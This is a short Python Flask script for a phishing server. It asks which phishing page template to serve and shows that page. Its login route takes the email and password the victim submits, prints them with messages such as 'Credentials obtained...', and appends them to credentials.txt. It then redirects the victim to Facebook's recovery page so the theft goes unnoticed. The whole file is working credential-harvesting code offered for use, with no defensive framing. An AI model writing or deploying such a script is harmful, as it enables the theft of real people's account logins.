from flask import Flask, render_template, request, redirect

page = input ("Enter page number: ")
app = Flask(__name__, template_folder='./')

@app.route('/')
def home():
    ip = ''
    print ("Target captured...")
    print (f"IP:{ip}")
    return render_template(f'.templates/{page}.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('user')
    password = request.form.get('pwd')
    print(email)
    if email and password:
        print ("Credentials obtained...")
        print (f'Email: {email}\nPassword:{password}')
        save_credentials(email, password)  
        print (f'Credentials saved at credentials.txt')
    return redirect('https://www.facebook.com/recover')

def save_credentials(email, password):
    with open('credentials.txt', 'a') as file:
        file.write(f'Email: {email}\n')
        file.write(f'Password: {password}\n')
        file.write(f'Phishing Page Number: {page}\n')
        file.write('---------------------\n')

if __name__ == '__main__':
    app.run()
